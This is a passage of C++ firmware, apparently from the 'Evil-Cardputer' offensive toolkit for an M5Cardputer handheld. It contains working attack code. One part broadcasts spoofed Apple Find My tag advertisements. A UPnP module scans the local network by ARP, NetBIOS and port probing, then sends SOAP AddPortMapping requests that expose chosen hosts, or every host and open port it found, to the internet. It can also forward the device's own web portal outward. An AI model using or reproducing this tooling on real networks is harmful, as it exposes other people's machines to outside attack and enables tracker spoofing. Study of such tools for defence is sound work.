  // UI init
  M5.Display.fillScreen(AT_BG);
  fmRedrawAll();

  enterDebounce();

  while (!exitRequested) {
    M5Cardputer.update();
    M5.update();

    // Quitter
    if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ||
        M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      exitRequested = true;
      continue;
    }

    // Toggle TX
    if (M5Cardputer.Keyboard.isKeyPressed(' ')) {
      if (fmTxOn) {
        fmStopRawAdv();
        fmTxOn = false;
        AT_LOG("[FM-TX] OFF\n");
      } else {
        // PremiÃ¨re mise en route: choix de mode si pas encore fait
        if (!fmModeChosen) {
          fmUseFindMy = confirmPopup("Use keys from SD?");
          fmModeChosen      = true;

          if (fmUseFindMy) {
            if (!fmLoadFindMyKeysFromSD()) {
              // Aucun tag chargÃ© : fallback LAB
              fmUseFindMy = false;
              AT_LOG("[FM-TX] fallback to LAB random (no SD keys)\n");
            }
          }
        }

        // Si aucun tag existant, on en crÃ©e au moins un selon le mode
        if (fmTagCount == 0) {
          if (fmUseFindMy) {
            // fmLoadFindMyKeysFromSD aurait dÃ» les remplir ; si on est ici, il a Ã©chouÃ©
            fmUseFindMy = false;
          }

          if (!fmUseFindMy) {
            // LAB mode: 1er tag random
            fmTags.clear();
            fmTags.emplace_back();
            fmGenAdvKeyLab(fmTags[0].adv_key);
            fmMacFromAdvKey(fmTags[0].adv_key, fmTags[0].mac);
            fmTagCount = (int)fmTags.size();
            fmTagIdx   = 0;

            AT_LOG("[FM-TX] LAB tag #0 KEY=%02X%02X%02X%02X...\n",
                   fmTags[0].adv_key[0], fmTags[0].adv_key[1],
                   fmTags[0].adv_key[2], fmTags[0].adv_key[3]);
          }
        }

        // DÃ©marrer ADV
        if (fmTagCount > 0) {
          fmStartTagRaw(fmTags[fmTagIdx]);
          fmLastSwitch = millis();
          fmTxOn       = true;
        } else {
          AT_LOG("[FM-TX] no tags available, TX not started\n");
        }
      }
      fmRedrawAll();
      delay(160);
    }

    // Ajouter un FakeTag (max 8) - LAB seulement
    if (M5Cardputer.Keyboard.isKeyPressed('n') || M5Cardputer.Keyboard.isKeyPressed('N')) {
      if (fmUseFindMy) {
        AT_LOG("[FM-TX] FindMy mode: 'N' disabled (keys from SD)\n");
      } else {
        while(M5Cardputer.Keyboard.isKeyPressed('n') || M5Cardputer.Keyboard.isKeyPressed('N')){
          M5Cardputer.update();
          delay(50);
        }
        if (fmTagCount < FMTAG_MAX) {
          fmTags.emplace_back();
          fmGenAdvKeyLab(fmTags[fmTagCount].adv_key);
          fmMacFromAdvKey(fmTags[fmTagCount].adv_key, fmTags[fmTagCount].mac);
          AT_LOG("[FM-TX] LAB add tag #%d MAC=%02X:%02X:%02X:%02X:%02X:%02X KEY=%02X%02X%02X%02X...\n",
                 fmTagCount,
                 fmTags[fmTagCount].mac[0], fmTags[fmTagCount].mac[1], fmTags[fmTagCount].mac[2],
                 fmTags[fmTagCount].mac[3], fmTags[fmTagCount].mac[4], fmTags[fmTagCount].mac[5],
                 fmTags[fmTagCount].adv_key[0], fmTags[fmTagCount].adv_key[1],
                 fmTags[fmTagCount].adv_key[2], fmTags[fmTagCount].adv_key[3]);
          fmTagCount = min(fmTagCount + 1, FMTAG_MAX);
          // Si ON, on bascule immÃ©diatement sur le nouveau tag (feedback visible sur scanner)
          if (fmTxOn) {
            fmTagIdx = fmTagCount - 1;
            fmStartTagRaw(fmTags[fmTagIdx]);
            fmLastSwitch = millis();
          }
          fmRedrawAll();
        } else {
          AT_LOG("[FM-TX] max 20 LAB tags reached\n");
        }
      }
      delay(160);
    }

    // Rotation adv_key (LAB uniquement)
    if (M5Cardputer.Keyboard.isKeyPressed('r') || M5Cardputer.Keyboard.isKeyPressed('R')) {
      if (fmUseFindMy) {
        AT_LOG("[FM-TX] FindMy mode: 'R' disabled (fixed keys from SD)\n");
      } else {
        if (fmTagCount > 0) {
          fmGenAdvKeyLab(fmTags[fmTagIdx].adv_key);
          fmMacFromAdvKey(fmTags[fmTagIdx].adv_key, fmTags[fmTagIdx].mac);
          if (fmTxOn) fmStartTagRaw(fmTags[fmTagIdx]);
          fmRedrawAll();
          AT_LOG("[FM-TX] LAB rotate tag #%d key=%02X%02X%02X%02X...\n",
                 fmTagIdx,
                 fmTags[fmTagIdx].adv_key[0], fmTags[fmTagIdx].adv_key[1],
                 fmTags[fmTagIdx].adv_key[2], fmTags[fmTagIdx].adv_key[3]);
        }
      }
      delay(120);
    }

    // Intervalle +/-
    if (M5Cardputer.Keyboard.isKeyPressed('+') || M5Cardputer.Keyboard.isKeyPressed('=')) {
      if (fmIntMs < 10000) fmIntMs = (uint16_t)min(10000, (int)fmIntMs + 200);
      if (fmTxOn && fmTagCount) fmStartTagRaw(fmTags[fmTagIdx]);
      fmRedrawAll();
      delay(120);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('-') || M5Cardputer.Keyboard.isKeyPressed('_')) {
      if (fmIntMs > 200) fmIntMs = (uint16_t)max(200, (int)fmIntMs - 200);
      if (fmTxOn && fmTagCount) fmStartTagRaw(fmTags[fmTagIdx]);
      fmRedrawAll();
      delay(120);
    }
    if (M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')) {
      M5.Display.fillScreen(TFT_BLACK);       // Efface l'Ã©cran
      M5.Display.setBrightness(10);           // RÃ©duction forte de la luminositÃ©
      AT_LOG("[FM-TX]Screen in standby mode, reduced brightness\n");
      while(M5Cardputer.Keyboard.isKeyPressed('b') || M5Cardputer.Keyboard.isKeyPressed('B')){
          M5Cardputer.update();
          delay(50);
      }
      // Attente d'une touche pour revenir (Ã©vite que l'Ã©cran reste noir indÃ©finiment)
      while (!M5Cardputer.Keyboard.isChange()) {
        M5Cardputer.update();
        delay(50);
      }
    
      M5.Display.setBrightness(defaultBrightness); // Restaure la luminositÃ©
      fmRedrawAll();                               // Redessine l'UI
      delay(150);
    }

    // Round-robin entre tags si ON et >1
    if (fmTxOn && fmTagCount > 1 && (millis() - fmLastSwitch) >= fmSlotMs) {
      fmLastSwitch = millis();
      fmTagIdx = (fmTagIdx + 1) % fmTagCount;
      fmStartTagRaw(fmTags[fmTagIdx]);
      // pas de redraw systÃ©matique pour Ã©viter flicker; UI mise Ã  jour pÃ©riodiquement suffit
    }

    delay(8);
  }

  // Sortie propre
  if (fmTxOn) fmStopRawAdv();
  waitAndReturnToMenu("FindMyEvil desactivated...");
}









/*
  ============================================================================================================================
  // ======== UPnP NAT ========
  ============================================================================================================================
*/
WiFiServer* upnpProxyServer = nullptr;
TaskHandle_t upnpProxyTaskHandle = NULL;
bool upnpProxyStarted = false;
uint16_t upnpProxyPort = 0; // port source du proxy

void upnpProxyTask(void* pv) {
    uint16_t proxyPort = (uint16_t)(uintptr_t)pv;

    static uint8_t bufClient[4096];
    static uint8_t bufTarget[4096];

    for (;;) {
        if (!upnpProxyServer) { taskYIELD(); continue; }

        WiFiClient client = upnpProxyServer->available();
        if (!client) { taskYIELD(); continue; }

        IPAddress selfIP = WiFi.localIP();
        WiFiClient target;

        if (!target.connect(selfIP, 80)) {
            client.stop();
            continue;
        }

        uint32_t lastActive = millis();

        while (client.connected() && target.connected()) {

            int n1 = client.available();
            if (n1 > 0) {
                if (n1 > sizeof(bufClient)) n1 = sizeof(bufClient);
                int r = client.read(bufClient, n1);
                if (r > 0) target.write(bufClient, r);
                lastActive = millis();
            }

            int n2 = target.available();
            if (n2 > 0) {
                if (n2 > sizeof(bufTarget)) n2 = sizeof(bufTarget);
                int r = target.read(bufTarget, n2);
                if (r > 0) client.write(bufTarget, r);
                lastActive = millis();
            }

            if (millis() - lastActive > 10000) break;

            taskYIELD();
        }

        client.stop();
        target.stop();
    }
}


void startProxyTo80(uint16_t localPort) {
    if (upnpProxyStarted && upnpProxyPort == localPort) {
        Serial.println("[PROXY] Already running on port " + String(localPort));
        return;
    }

    // Si un ancien serveur existait, on le libÃ¨re
    if (upnpProxyServer) {
        delete upnpProxyServer;
        upnpProxyServer = nullptr;
    }

    upnpProxyServer = new WiFiServer(localPort);
    upnpProxyServer->begin();
    upnpProxyStarted = true;
    upnpProxyPort = localPort;

    Serial.println("[PROXY] Listening on port " + String(localPort) + " â†’ 80");

    // Lancer la tÃ¢che une seule fois
    if (upnpProxyTaskHandle == NULL) {
      xTaskCreate(
          upnpProxyTask,
          "UPNP_ProxyTask",
          8192,                 // Stack 8 KB
          (void*)(uintptr_t)localPort,
          1,                     // prioritÃ© plus Ã©levÃ©e
          &upnpProxyTaskHandle
      );
    }
}


int menuSelectList(const std::vector<String>& items, const char* title) {
    int index = 0;
    int top = 0;
    const int visibleLines = 9;
    const int lineHeight = 12;
    int lastTop = -1;
    int lastIndex = -1;

    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setCursor(5, 5);
    M5.Display.println(title);

    while (true) {
        M5Cardputer.update();

        if (index != lastIndex || top != lastTop) {
            M5.Display.fillRect(0, 20, M5.Display.width(), M5.Display.height() - 20, TFT_BLACK);

            for (int i = 0; i < visibleLines; ++i) {
                int itemIdx = top + i;
                if (itemIdx >= items.size()) break;

                if (itemIdx == index) {
                    M5.Display.fillRect(0, 20 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }

                M5.Display.setCursor(5, 20 + i * lineHeight);
                M5.Display.println(items[itemIdx]);
            }

            lastIndex = index;
            lastTop = top;
        }

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            index = (index > 0) ? index - 1 : items.size() - 1;
            if (index < top) top = index;
            if (index >= top + visibleLines) top = index - visibleLines + 1;
            delay(150);
        }

        if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            index = (index < items.size() - 1) ? index + 1 : 0;
            if (index < top) top = index;
            if (index >= top + visibleLines) top = index - visibleLines + 1;
            delay(150);
        }

        if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) return index;
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) return -1;

        delay(30);
    }
}


// NetBIOS hostname scanner
bool scanNetbiosName(IPAddress ip, String& outName) {
    WiFiUDP udp;
    uint8_t packet[50] = {
        0xA3,0x05,0x00,0x00,0x00,0x01,0x00,0x00,
        0x00,0x00,0x00,0x00,0x20,
        'C','K','A','A','A','A','A','A','A','A','A','A','A','A','A','A',
        'A','A','A','A','A','A','A','A','A','A','A','A','A','A','A','A',
        0x00,0x00,0x21,0x00,0x01
    };

    udp.begin(137);
    udp.beginPacket(ip, 137);
    udp.write(packet, sizeof(packet));
    udp.endPacket();

    uint32_t t0 = millis();
    while (millis() - t0 < 300) {
        int len = udp.parsePacket();
        if (len > 0) {
            uint8_t buf[180];
            udp.read(buf, sizeof(buf));
            String nb = "";
            for (int i = 57; i < 72; i++) {
                if (buf[i] >= 32 && buf[i] <= 126) nb += (char)buf[i];
            }
            nb.trim();
            outName = nb;
            return true;
        }
        delay(10);
    }
    return false;
}

bool upnpDiscoverControlURL(String& controlURL, IPAddress& routerIP, uint16_t& routerPort, String& serviceType) {
    WiFiUDP udp;
    udp.begin(1900);

    Serial.println("[UPnP] Sending SSDP M-SEARCH...");
    const char req[] =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST:239.255.255.250:1900\r\n"
        "MAN:\"ssdp:discover\"\r\n"
        "MX:1\r\n"
        "ST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\n\r\n";

    udp.beginPacket(IPAddress(239, 255, 255, 250), 1900);
    udp.write((uint8_t*)req, strlen(req));
    udp.endPacket();

    String locationURL = "";

    uint32_t t0 = millis();
    while (millis() - t0 < 3000) {
        int len = udp.parsePacket();
        if (len > 0) {
            String resp = udp.readString();
            Serial.println("[UPnP] SSDP response received:\n" + resp);

            int locPos = resp.indexOf("LOCATION:");
            if (locPos < 0) continue;

            int start = resp.indexOf("http://", locPos);
            int end = resp.indexOf("\r\n", start);
            locationURL = resp.substring(start, end);
            locationURL.trim();

            Serial.println("[UPnP] LOCATION found: " + locationURL);

            // Extraction IP & PORT
            int ipStart = 7;
            int ipEnd = locationURL.indexOf(':', ipStart);
            int portStart = ipEnd + 1;
            int portEnd = locationURL.indexOf('/', portStart);

            String ipStr = locationURL.substring(ipStart, ipEnd);
            String portStr = locationURL.substring(portStart, portEnd);

            routerIP.fromString(ipStr);
            routerPort = portStr.toInt();

            Serial.println("[UPnP] Router IP: " + routerIP.toString());
            Serial.println("[UPnP] Router Port: " + String(routerPort));
            break;
        }
    }

    if (locationURL == "") {
        Serial.println("[UPnP] LOCATION not found in SSDP response.");
        return false;
    }

    // Fetch XML
    String path = locationURL.substring(locationURL.indexOf('/', 7));
    Serial.println("[UPnP] Fetching XML from: " + path);

    WiFiClient client;
    if (!client.connect(routerIP, routerPort)) {
        Serial.println("[UPnP] Connection to router failed");
        return false;
    }

    client.print("GET " + path + " HTTP/1.1\r\n");
    client.print("Host: " + routerIP.toString() + "\r\n");
    client.print("Connection: close\r\n\r\n");

    String xml = "";
    uint32_t startTime = millis();
    while (millis() - startTime < 3000) {
        while (client.available()) {
            xml += (char)client.read();
        }
    }
    client.stop();

    Serial.println("[UPnP] XML Description received:");
    Serial.println(xml);

    // Find WANIPConnection service
    int wanPos = xml.indexOf("<serviceType>urn:schemas-upnp-org:service:WANIPConnection");
    if (wanPos < 0) {
        Serial.println("[UPnP] WANIPConnection service not found.");
        return false;
    }

    int typeStart = xml.indexOf("<serviceType>", wanPos) + 13;
    int typeEnd = xml.indexOf("</serviceType>", typeStart);
    serviceType = xml.substring(typeStart, typeEnd);

    int urlStart = xml.indexOf("<controlURL>", wanPos) + 12;
    int urlEnd = xml.indexOf("</controlURL>", urlStart);
    String urlPart = xml.substring(urlStart, urlEnd);
    urlPart.trim();

    controlURL = "http://" + routerIP.toString() + ":" + String(routerPort) + urlPart;

    Serial.println("[UPnP] Detected service type: " + serviceType);
    Serial.println("[UPnP] Extracted controlURL: " + controlURL);
    return true;
}



bool upnpAddPortMapping(IPAddress targetIP, uint16_t internalPort, uint16_t externalPort) {
    String controlURL;
    IPAddress routerIP;
    uint16_t routerPort = 80; // valeur par dÃ©faut
    String serviceType;
    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) {
        Serial.println("[UPnP] IGD not found.");
        return false;
    }

    String path = controlURL.substring(controlURL.indexOf('/', 7)); // extrait /xxx/yyy
    Serial.println("[UPnP] Final control path: " + path);

    WiFiClient client;
    if (!client.connect(routerIP, routerPort)) {
        Serial.println("[UPnP] Cannot connect to router at: " + routerIP.toString() + ":" + String(routerPort));
        return false;
    }

    String xml =
        "<?xml version=\"1.0\"?>"
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
        "<s:Body>"
        "<u:AddPortMapping xmlns:u=\"" + serviceType + "\">"
        "<NewRemoteHost></NewRemoteHost>"
        "<NewExternalPort>" + String(externalPort) + "</NewExternalPort>"
        "<NewProtocol>TCP</NewProtocol>"
        "<NewInternalPort>" + String(internalPort) + "</NewInternalPort>"
        "<NewInternalClient>" + targetIP.toString() + "</NewInternalClient>"
        "<NewEnabled>1</NewEnabled>"
        "<NewPortMappingDescription>Evil-Cardputer</NewPortMappingDescription>"
        "<NewLeaseDuration>0</NewLeaseDuration>"
        "</u:AddPortMapping>"
        "</s:Body>"
        "</s:Envelope>";

    // Send HTTP POST request
    client.println("POST " + path + " HTTP/1.1");
    client.println("Host: " + routerIP.toString());
    client.println("Content-Type: text/xml; charset=\"utf-8\"");
    client.println("SOAPAction: \"" + serviceType + "#AddPortMapping\"");
    client.println("Content-Length: " + String(xml.length()));
    client.println("Connection: close");
    client.println();
    client.print(xml);

    // Await HTTP response
    uint32_t t0 = millis();
    while (millis() - t0 < 3000) {
        if (client.available()) {
            String statusLine = client.readStringUntil('\n');
            Serial.println("[UPnP] HTTP Response: " + statusLine);
            if (statusLine.indexOf("200") != -1) {
                Serial.println("[UPnP] NAT mapping succeeded.");
                return true;
            } else {
                Serial.println("[UPnP] Mapping failed. HTTP response:");
                Serial.println(statusLine);
                return false;
            }
        }
    }

    Serial.println("[UPnP] No HTTP response received.");
    return false;
}

String getExternalWANIP() {
    String controlURL, serviceType;
    IPAddress routerIP;
    uint16_t routerPort = 80;

    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) return "N/A";

    WiFiClient client;
    if (!client.connect(routerIP, routerPort)) return "N/A";

    String path = controlURL.substring(controlURL.indexOf('/', 7));
    const char* soap =
        "<?xml version=\"1.0\"?>"
        "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
        "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
        "<s:Body><u:GetExternalIPAddress xmlns:u=\"%s\" /></s:Body></s:Envelope>";

    char soapBody[512];
    snprintf(soapBody, sizeof(soapBody), soap, serviceType.c_str());

    client.printf("POST %s HTTP/1.1\r\n", path.c_str());
    client.printf("Host: %s\r\n", routerIP.toString().c_str());
    client.println("Content-Type: text/xml; charset=\"utf-8\"");
    client.printf("SOAPAction: \"%s#GetExternalIPAddress\"\r\n", serviceType.c_str());
    client.printf("Content-Length: %d\r\n", strlen(soapBody));
    client.println("Connection: close\r\n");
    client.print(soapBody);

    char buffer[1024] = {0};
    uint32_t t0 = millis();
    size_t len = 0;
    while (millis() - t0 < 2000 && len < sizeof(buffer) - 1) {
        if (client.available()) {
            len += client.readBytes(buffer + len, sizeof(buffer) - 1 - len);
        }
    }

    buffer[len] = '\0';

    const char* tagStart = strstr(buffer, "<NewExternalIPAddress>");
    if (!tagStart) return "N/A";

    tagStart += strlen("<NewExternalIPAddress>");
    const char* tagEnd = strstr(tagStart, "</NewExternalIPAddress>");
    if (!tagEnd) return "N/A";

    char ip[32] = {0};
    size_t ipLen = tagEnd - tagStart;
    if (ipLen >= sizeof(ip)) return "N/A";

    strncpy(ip, tagStart, ipLen);
    ip[ipLen] = '\0';
    return String(ip);
}


void upnpAllHostsAllPorts(const std::vector<IPAddress>& hosts) {
    enterDebounce();
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("FULL AUTO NAT MODE");
    M5.Display.println("------------------");

    static const uint16_t portsToTest[] = {
        80,81,82,88,443,4443,8000,8008,8080,8081,8443,8888,
        22,23,2222,3389,5900,1723,5000,5001,554,
        25565,27015,3074,
        51413,6881,6889,
        49152,49153,49154,49155
    };
    const uint16_t nbPorts = sizeof(portsToTest)/sizeof(uint16_t);

    uint16_t extBase = 50001;
    uint32_t mapCount = 0;
    int cursorY = M5.Display.getCursorY();

    IPAddress selfIP = WiFi.localIP();

    for (const auto& target : hosts) {
        std::vector<uint16_t> openPorts;

        for (uint16_t p : portsToTest) {
            if (isPortOpen(target, p, 300)) {
                openPorts.push_back(p);
                Serial.println("[OPEN] " + target.toString() + ":" + String(p));
            }
        }

        if (openPorts.empty()) continue;

        for (uint16_t p : openPorts) {
            uint16_t externalPort = extBase + mapCount;
            bool success = upnpAddPortMapping(target, p, externalPort);

            String line = (success ? "[OK] " : "[FAIL] ");
            line += target.toString() + ":" + String(p);
            if (success) {
                line += " â†’ " + String(externalPort);
                mapCount++;
            }

            Serial.println("[MAP] " + line);

            M5.Display.setCursor(5, cursorY);
            M5.Display.println(line);
            cursorY += 13;

            if (cursorY > 120) {
                M5.Display.clear();
                M5.Display.setCursor(5, 0);
                cursorY = 0;
            }

            if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                waitAndReturnToMenu("Stopped by user");
                return;
            }

            delay(50); // lÃ©ger dÃ©lai pour stabilitÃ©
        }
    }

    // RÃ©sumÃ©
    String wan = getExternalWANIP();
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.println("DONE.");
    M5.Display.println("WAN IP:");
    M5.Display.println(wan);
    M5.Display.println("Mapped: " + String(mapCount));
    delay(4000);

    waitAndReturnToMenu("Auto NAT done");
}




void upnpTargetNATWorkflow() {
    if (WiFi.localIP().toString() == "0.0.0.0") {
      waitAndReturnToMenu("Not connected...");
      return;
    } 
    enterDebounce();

    std::vector<IPAddress> hosts;
    char base_ip[16];
    IPAddress net = WiFi.localIP();
    sprintf(base_ip, "%d.%d.%d.", net[0], net[1], net[2]);

    // Affichage initial
    M5.Display.clear();
    M5.Display.setCursor(5, 5);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.println("Starting ARP scan...");
    delay(600);

    // ARP passif et table
    send_arp(base_ip, hosts);
    read_arp_table(base_ip, 1, 254, hosts);

    // Booster ARP actif
    M5.Display.clear();
    M5.Display.setCursor(5, 5);
    M5.Display.setTextSize(1);
    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    M5.Display.println("Scanning ARP...");

    int line = 1;
    for (int i = 1; i <= 254; i++) {
        IPAddress currentIP(net[0], net[1], net[2], i);
        if (arpRequest(currentIP)) {
            bool exists = false;
            for (auto &h : hosts) {
                if (h == currentIP) { exists = true; break; }
            }
            if (!exists) {
                hosts.push_back(currentIP);
                Serial.println("[ARP] Found: " + currentIP.toString());
                M5.Display.setCursor(5, line * 10);
                M5.Display.println(currentIP.toString());
                line++;
                if (line >= 12) {
                    M5.Display.clear();
                    line = 1;
                }
            }
        }
    }

    if (hosts.empty()) {
        waitAndReturnToMenu("No hosts found");
        return;
    }

    // Ajout du Cardputer lui-mÃªme
    IPAddress selfIP = WiFi.localIP();
    hosts.push_back(selfIP);

    // CrÃ©ation des labels
    std::vector<String> labels;
    for (auto ip : hosts) {
        if (ip == selfIP) {
            labels.push_back(ip.toString() + " - Evil");
        } else {
            String nb = "unknown";
            scanNetbiosName(ip, nb);
            labels.push_back(ip.toString() + " - " + nb);
        }
    }

    // ðŸ”¥ Ajout de lâ€™option ALL
    labels.push_back("ALL HOSTS + ALL PORTS");

    // SÃ©lection de la cible
    int idx = menuSelectList(labels, "Select Target");
    if (idx < 0) return;

    // Mode spÃ©cial : ALL
    bool modeAll = (idx == labels.size() - 1);
    if (modeAll) {
        upnpAllHostsAllPorts(hosts);
        return;
    }

    IPAddress targetIP = hosts[idx];

    uint16_t internalPort = 0;
    bool isSelf = (targetIP == selfIP);

    if (isSelf) {
        enterDebounce();
        std::vector<String> selfOptions = {"Use Port 80 (direct)", "Use other (proxy)"};
        int sel = menuSelectList(selfOptions, "Evil-cardputer mode");
        if (sel < 0) return;

        if (sel == 0) {
            internalPort = 80;
            Serial.println("[UPnP] Using existing portal on port 80 (direct).");
        } else {
            enterDebounce();
            M5.Display.clear();
            M5.Display.setCursor(5, 5);
            M5.Display.println("Proxy local port (ex: 81)");
            String localPortStr = getUserInput("Proxy local port (ex: 8080):");
            uint16_t localPort = localPortStr.toInt();
            if (localPort == 0 || localPort > 65535) {
                waitAndReturnToMenu("Invalid port");
                return;
            }

            Serial.println("[UPnP] Starting proxy on " + String(localPort) + " â†’ 80...");
            startProxyTo80(localPort);
            internalPort = localPort;
            delay(300);
            Serial.println("[UPnP] Proxy active on " + String(localPort) + " â†’ 80");
        }
    } else {
        std::vector<uint16_t> ports = {
            80,81,82,88,443,4443,8000,8008,8080,8081,8443,8888,
            9000,10000,22,2222,23,3389,3390,5900,
            1723,500,4500,3478,3479,3659,5060,5061,
            32400,5000,5001,5005,5006,554,8200,
            25565,27015,27016,27036,3074,
            51413,6881,6882,6883,6889,
            49152,49153,49154,49155,49156,49157,49158,49159
        };

        std::vector<uint16_t> openPorts;
        for (uint16_t port : ports) {
            if (isPortOpen(targetIP, port, 500)) {
                openPorts.push_back(port);
                Serial.println("[PORT] Open: " + targetIP.toString() + ":" + String(port));
            }
        }

        if (openPorts.empty()) {
            waitAndReturnToMenu("No open ports");
            return;
        }

        enterDebounce();
        std::vector<String> portLabels;
        for (auto p : openPorts) portLabels.push_back("Port " + String(p));
        int portIdx = menuSelectList(portLabels, "Select Port");
        if (portIdx < 0) return;

        internalPort = openPorts[portIdx];
    }

    // ðŸ”¸ Demande du port externe Ã  mapper
    enterDebounce();
    M5.Display.clear();
    M5.Display.setCursor(5, 5);
    M5.Display.println("Set external port:");
    String p = getUserInput("External port:");
    uint16_t externalPort = p.toInt();
    if (externalPort == 0 || externalPort > 65535) {
        waitAndReturnToMenu("Invalid port");
        return;
    }

    // ðŸ”¸ Envoi de la requÃªte UPnP
    M5.Display.clear();
    M5.Display.setCursor(5, 5);
    M5.Display.println("NAT via UPnP...");
    M5.Display.println("Target: " + targetIP.toString());
    M5.Display.println("Internal: " + String(internalPort));
    M5.Display.println("External: " + String(externalPort));

    Serial.println("[UPnP] Requesting NAT for: " + targetIP.toString());
    Serial.println("[UPnP] Internal port: " + String(internalPort));
    Serial.println("[UPnP] External port: " + String(externalPort));

    bool success = upnpAddPortMapping(targetIP, internalPort, externalPort);

    if (success) {
        String wanIP = getExternalWANIP();
        M5.Display.clear();
        M5.Display.setCursor(5, 0);
        M5.Display.println("Exposed on:\n " + wanIP + ":" + String(externalPort));
        delay(5000);
        waitAndReturnToMenu((wanIP + ":" + String(externalPort)).c_str());
    } else {
        waitAndReturnToMenu("NAT failed");
    }
}


/*
  ============================================================================================================================
  // ======== UPnP Mapping ========
  ============================================================================================================================
*/
int extractSoapErrorCode(const String& response) {
    int start = response.indexOf("<errorCode>");
    int end = response.indexOf("</errorCode>");
    if (start != -1 && end != -1) {
        return response.substring(start + 11, end).toInt();
    }
    return 0; // Pas dâ€™erreur
}

String extractXmlTag(const String& xml, const String& tag) {
    String openTag = "<" + tag + ">";
    String closeTag = "</" + tag + ">";
    int start = xml.indexOf(openTag);
    int end = xml.indexOf(closeTag);
    if (start == -1 || end == -1 || end <= start) return "";

    String content = xml.substring(start + openTag.length(), end);
    content.trim();
    return content;
}


void listUPnPMappings() {
    if (WiFi.localIP().toString() == "0.0.0.0") {
        waitAndReturnToMenu("Not connected...");
        return;
    }

    enterDebounce();
    M5.Display.clear();
    M5.Display.setCursor(5, 0);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
    M5.Display.println("Listing UPnP");
    M5.Display.println("---------------------");

    String controlURL;
    IPAddress routerIP;
    uint16_t routerPort = 80;
    String serviceType;

    if (!upnpDiscoverControlURL(controlURL, routerIP, routerPort, serviceType)) {
        waitAndReturnToMenu("UPnP IGD not found");
        return;
    }

    String path = controlURL.substring(controlURL.indexOf('/', 7));
    int index = 0;
    int cursorY = M5.Display.getCursorY();
    char xmlBuffer[1024];     // buffer statique pour rÃ©ponse
    char lineBuffer[64];      // buffer pour affichage

    while (true) {
        WiFiClient client;
        if (!client.connect(routerIP, routerPort)) break;

        // Construction manuelle de la requÃªte (rÃ©duction allocations dynamiques)
        String soap = 
            "<?xml version=\"1.0\"?>"
            "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" "
            "s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
            "<s:Body>"
            "<u:GetGenericPortMappingEntry xmlns:u=\"" + serviceType + "\">"
            "<NewPortMappingIndex>" + String(index) + "</NewPortMappingIndex>"
            "</u:GetGenericPortMappingEntry>"
            "</s:Body></s:Envelope>";

        String header = 
            "POST " + path + " HTTP/1.1\r\n" +
            "Host: " + routerIP.toString() + "\r\n" +
            "Content-Type: text/xml; charset=\"utf-8\"\r\n" +
            "SOAPAction: \"" + serviceType + "#GetGenericPortMappingEntry\"\r\n" +
            "Content-Length: " + String(soap.length()) + "\r\n" +
            "Connection: close\r\n\r\n";

        client.print(header + soap);

        // Lecture de la rÃ©ponse dans le buffer
        memset(xmlBuffer, 0, sizeof(xmlBuffer));
        size_t len = 0;
        uint32_t t0 = millis();
        while (millis() - t0 < 1500 && len < sizeof(xmlBuffer) - 1) {
            if (client.available()) {
                len += client.readBytes(xmlBuffer + len, sizeof(xmlBuffer) - 1 - len);
            }
        }
        client.stop();
        xmlBuffer[len] = '\0'; // terminaison

        String resp(xmlBuffer);

        int errorCode = extractSoapErrorCode(resp);
        if (errorCode == 713) break; // NoSuchEntryInArray
        if (errorCode != 0) {
            String err = "UPnP error: " + String(errorCode);
            Serial.println("[UPnP] SOAP Error " + String(errorCode));
            waitAndReturnToMenu(err.c_str());
            return;
        }

        String intPort = extractXmlTag(resp, "NewInternalPort");
        String extPort = extractXmlTag(resp, "NewExternalPort");
        String intClient = extractXmlTag(resp, "NewInternalClient");

        if (intPort.isEmpty() || extPort.isEmpty() || intClient.isEmpty()) {
            snprintf(lineBuffer, sizeof(lineBuffer), "[Invalid]");
        } else {
            snprintf(lineBuffer, sizeof(lineBuffer), "%s > %s:%s", 
                     extPort.c_str(), intClient.c_str(), intPort.c_str());
        }

        Serial.println("[UPnP MAP] " + String(lineBuffer));

        M5.Display.setCursor(5, cursorY);
        M5.Display.println(lineBuffer);
        cursorY += 13;

        if (cursorY > 120) {
            M5.Display.clear();
            M5.Display.setCursor(5, 0);
            cursorY = 0;
        }

        index++;

        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            waitAndReturnToMenu("Stopped");
            return;
        }
    }
        cursorY += 13;
        M5.Display.setCursor(5, cursorY);
        M5.Display.println("- End -");

    while (!M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        M5Cardputer.update();
        delay(10);
    }

    if (index == 0) {
        waitAndReturnToMenu("No mappings found");
    } else {
